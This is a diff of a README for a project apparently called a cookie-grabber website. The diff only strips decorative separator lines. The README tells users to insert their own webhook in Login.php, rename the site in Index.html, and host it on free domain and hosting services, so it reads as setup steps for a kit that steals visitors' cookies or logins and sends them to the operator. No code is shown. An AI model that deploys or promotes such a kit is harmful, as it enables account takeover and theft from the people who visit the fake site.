@@ -1,10 +1,9 @@
 # Cookie-Grabber-Website-By-Kxzn
 
-#################################################
+
 
 This Is Made By Kxzn#1000 Dont Try To Skid It Kid
 
-#################################################
 
 Change The Webhook In Login.php , You can Also Change The Embed Bot Username
 
@@ -12,11 +11,10 @@ Change The Site Name In Index.html
 
 Get Your Own Domain
 
-#################################################
+
 FREE DOMAINS & HOSTING
 https://000webhost.com
 https://freenom.com
-#################################################
 
 Results Should Look Like This
 
